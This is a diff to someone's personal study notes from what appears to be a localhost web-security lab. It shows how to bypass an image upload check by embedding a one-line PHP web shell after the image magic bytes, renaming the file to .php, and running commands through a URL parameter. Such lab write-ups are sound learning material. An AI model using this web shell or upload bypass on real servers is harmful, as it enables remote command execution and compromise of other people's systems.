@@ -2761,7 +2761,36 @@ search on google the blowfish mode for hashcat  (is 3200)
 
 now:
 <span style="background:#fff88f">login with this credentials and try to access to the admin page that we found before:</span>
+=>
+here we can upload a new coffe (<span style="color:#00b050">and also an image</span>)
 
+### File Upload - Capstone
+#### Shell - Capstone
+- turn on FoxyProxy
+- Setup initial things for BurpSuite -->  [[cheet#Initial things to do]]
+- upload a new coffe through the admin page
+- open the req inside burp > send it to Repeater
+-  Insert our shell inside the image after the magic bytes and delete a portion of it
+   `<?php system($_GET['cmd']); ?>`
+-  change the filetype to php
+- click on Send 
+  =>
+  ![[Pasted image 20240310190447.png]]
+ _<span style="color:#00b050"> the image is been uploaded</span>
+	
+now:
+refresh the home page and see the new coffee that you've uploaded
+- `CTRL+SHIFT+C` -->  to open the dev mod
+	![[Pasted image 20240310190848.png]]
+- <span style="background:#fff88f">check where the img is been uploaded</span> -->  `/assets/10.png`
+  =>
+  try to connect to it:
+  `http://localhost/capstone/assets/10.php`
+	![[Pasted image 20240310190928.png]]
+=>
+<span style="background:#fff88f">let's add our parameter:</span>
+  `http://localhost/capstone/assets/10.php?cmd=whoami`
+  ![[Pasted image 20240310191102.png]]
 ### XSS - Capstone
 when you login:
 the mex that you see in the website is also reflected in the URL
